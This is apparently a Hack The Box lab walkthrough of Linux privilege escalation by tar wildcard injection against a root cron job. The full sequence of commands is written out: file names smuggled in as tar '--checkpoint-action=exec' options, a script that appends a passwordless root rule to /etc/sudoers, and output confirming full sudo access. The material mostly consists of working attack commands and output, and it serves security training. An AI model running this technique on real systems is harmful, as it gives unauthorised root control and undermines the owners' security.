# Wildcard Abuse

## Root Cron Job

```sh
root@NIX02:~# crontab -l
```

```output title="Output"
*/01 * * * * cd /home/htb-student && tar czf /home/htb-student/backup.tar.gz *
```

## Creating the Files

```sh
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ touch -- '--checkpoint=1'
htb-student@NIX02:~$ touch -- '--checkpoint-action=exec=sh root.sh'
htb-student@NIX02:~$ ls -l
```

```output title="Output"
total 4
-rw-r--r-- 1 htb-student htb-student  0 May 15 15:49 '--checkpoint=1'
-rw-r--r-- 1 htb-student htb-student  0 May 15 15:49 '--checkpoint-action=exec=sh root.sh'
-rw-r--r-- 1 htb-student htb-student 54 May 15 15:49  root.sh
```

## Checking

```sh
htb-student@NIX02:~$ sudo -l
```

```output title="Output" hl_lines="8"
Matching Defaults entries for htb-student on NIX02:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/bin

Runas and Command-specific defaults for htb-student:
    Defaults!/usr/bin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```
